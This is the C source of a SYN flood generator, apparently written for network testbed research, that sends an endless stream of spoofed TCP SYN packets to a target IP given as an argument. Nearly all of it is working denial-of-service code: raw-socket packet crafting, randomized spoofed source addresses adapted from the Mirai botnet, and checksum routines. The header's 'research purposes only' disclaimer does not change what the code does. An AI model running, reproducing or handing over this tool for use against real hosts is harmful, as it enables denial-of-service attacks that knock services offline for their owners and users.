/*
Generate a TCP SYN flood

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>


#define DEBUG 0 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 1 // Toggle source address randomization
#define RAND_SRC_PORT 1 // Toggle source port randomization
#define RAND_ID 1 // Toggle IP ID randomization
#define FAST_CSUM 0 // Toggle fast checksum updating (experimental)

#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

#define TCP_OPT_LEN 20


/*
  Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus a standard SYN packet (including the IP
	header) is only 40 bytes, and at most 100.  Other attack packets also tend to
	be very small in order to maximize per-packet overhead in the network.
*/
const uint32_t MAX_PACKET_SIZE = 9000;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "127.0.0.1";

// Destination IP, unless otherwise specified with argv[1]
const char default_dst_addr[32] = "127.0.0.1";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 9000;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 80;

volatile int busy_wait_var;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(iph->check);
  sum = (sum & 0xffff) + (sum>>16);
  iph->check = htons(sum + (sum>>16) + 1);
}

static void update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(tcph->check);
  sum = (sum & 0xffff) + (sum>>16);
  tcph->check = htons(sum + (sum>>16) + 1);
}

static uint32_t random_ipv4(void) {
  // Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
  uint32_t addr;
  uint8_t o1, o2, o3, o4;

  do {
    addr = (uint32_t)(rand());
    o1 = addr & 0xff;
    o2 = (addr >> 8) & 0xff;
    o3 = (addr >> 16) & 0xff;
    o4 = (addr >> 24) & 0xff;
  }

  while (
    // Skip private and reserved addresses, and DETERLab's network
    // https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

    (o1 == 0) ||								// 0.0.0.0/8		- Current Network
    (o1 == 10) ||								// 10.0.0.0/8		- Private
    (o1 == 100 && o2 >= 64 && o2 < 128) ||		// 100.64.0.0/10	- Carrier grade NAT
    (o1 == 127) ||								// 127.0.0.0/8		- Loopback
    (o1 == 169 && o2 == 254) ||					// 169.254.0.0/16	- Link-local
    (o1 == 172 && o2 >= 16 && o2 < 32) ||		// 172.16.0.0/12	- Private
    (o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 ||						// 192.0.0.0/24		- Private
				o3 == 2							// 192.0.2.0/24		- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||			// 192.88.99.0/24	- Reserved
			(o2 == 168)							// 192.168.0.0/16	- Private
		)) ||
    (o1 == 198 && (
			(o2 == 18 || o2 == 19) ||			// 198.18.0.0/15	- Private
			(o2 == 51 && o3 == 100)				// 198.51.100.0/24	- Documentation
		)) ||
    (o1 == 203 && o2 == 0 && o3 == 113) ||		// 203.0.113.0/24	- Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||	// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||	// 206.117.31.0/24	- DeterLab High Performance
    (o1 >= 224)									// 224.0.0.0+		- Various multicast/reserved
  );
  return addr;
}

static uint16_t random_port(void) {
	uint16_t port = (uint16_t)(rand()) & 0xff;
	return port;
}

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32];
	uint16_t dst_port;
	uint32_t busy_wait;

	if (argc > 1) {
		strcpy(dst_addr, argv[1]);
	} else {
    printf("Please specify a target IP address, and optionally a port number (default destination port is 80).\nExample usage: syn_flood 127.0.0.1 80\n");
		exit(1);
	}

	// if (argc > 2) {
	// 	dst_port = (uint16_t)atoi(argv[2]);
	// } else {
	// 	dst_port = default_dst_port;
	// }

	if (argc > 2) {
		busy_wait = (uint32_t)atoi(argv[2]);
	} else {
		busy_wait = 0;
	}

	if (busy_wait < 0) {
		#if DEBUG
			printf("Received negative value for busywait parameter %u, exiting.\n", busy_wait);
		#endif
		return 1;
	}


	#if DEBUG
		printf ("Flooding target %s:%u\n", dst_addr, dst_port);

		#if RAND_SRC_ADDR
			printf("Randomizing source address\n");
		#else
			printf("Using source address %s\n", default_src_addr);
		#endif

		#if RAND_SRC_PORT
			printf("Randomizing source port\n");
		#else
			printf("Using source port %u\n", default_src_port);
		#endif
	#endif


	// Seed RNG
	srand(time(NULL));
	rand_init();

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	// char *data;

	// Pointer for the pseudo-header used in TCP checksum
	// char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
	uint8_t *opts = (uint8_t *)(tcph + 1);
	// struct pseudo_header psh;

	// TCP Payload
	// data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + TCP_OPT_LEN;
	// strcpy(data, "");

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN);// + strlen(data); //20 bytes of options
	iph->id = htons(0);	//Id of this packet, can be any value
	iph->frag_off = htons(1 <<14);
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(default_src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// // IP checksum
	// iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// TCP Header
	tcph->source = htons(default_src_port);
	tcph->dest = sin.sin_port;
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 10; // TCP Header Size in 32-bit words (5-15)
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	// tcph->window = htons(65535); // Maximum possible window size (without scaling)
	tcph->check = 0;
	tcph->urg_ptr = 0;

	// TCP MSS
	*opts++ = PROTO_TCP_OPT_MSS;    // Kind
	*opts++ = 4;                    // Length
	*((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
	opts += sizeof (uint16_t);

	// TCP SACK permitted
	*opts++ = PROTO_TCP_OPT_SACK;
	*opts++ = 2;

	// TCP timestamps
	*opts++ = PROTO_TCP_OPT_TSVAL;
	*opts++ = 10;
	*((uint32_t *)opts) = rand_next();
	opts += sizeof (uint32_t);
	*((uint32_t *)opts) = 0;
	opts += sizeof (uint32_t);

	// TCP nop
	*opts++ = 1;

	// TCP window scale
	*opts++ = PROTO_TCP_OPT_WSS;
	*opts++ = 3;
	*opts++ = 6; // 2^6 = 64, window size scale = 64

	// // TCP checksum
	// psh.source_address = inet_addr(default_src_addr);
	// psh.dest_address = sin.sin_addr.s_addr;
	// psh.placeholder = 0;
	// psh.protocol = IPPROTO_TCP;
	// psh.tcp_length = htons(sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));

	// int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data);
	// pseudogram = malloc(psize);

	// memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	// memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));

	// tcph->check = csum((unsigned short*) pseudogram, psize);

	// __be32 old_saddr;
	// __be32 new_saddr;
	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
		// Generate a new random source IP, excluding certain prefixes
		// new_saddr = (__be32)(random_ipv4());
		iph->saddr = (__be32)(random_ipv4());
		iph->id = rand_next() & 0xffff;		

		// tcph->window = rand_next() & 0xffff;
		tcph->source = rand_next() & 0xffff;
		tcph->dest =htons(80);
		sin.sin_port = tcph->dest;
		tcph->seq = rand_next() & 0xffff;

		iph->check = 0;
		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
		tcph->check = 0;
		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
		
		// psh.source_address = new_saddr;
		// memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
		// memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
		// tcph->check = csum( (unsigned short*) pseudogram , psize);

		// Send the packet
		if (sendto (s, datagram, sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, tcph->source, iph->daddr, tcph->dest);
		#endif

		#if DELAY
			sleep(DELAY);
		#endif

		if (busy_wait) {
			for (int i=0; i<busy_wait; i++) {
				busy_wait_var += 1;
			}
		}
	}
	return 0;
}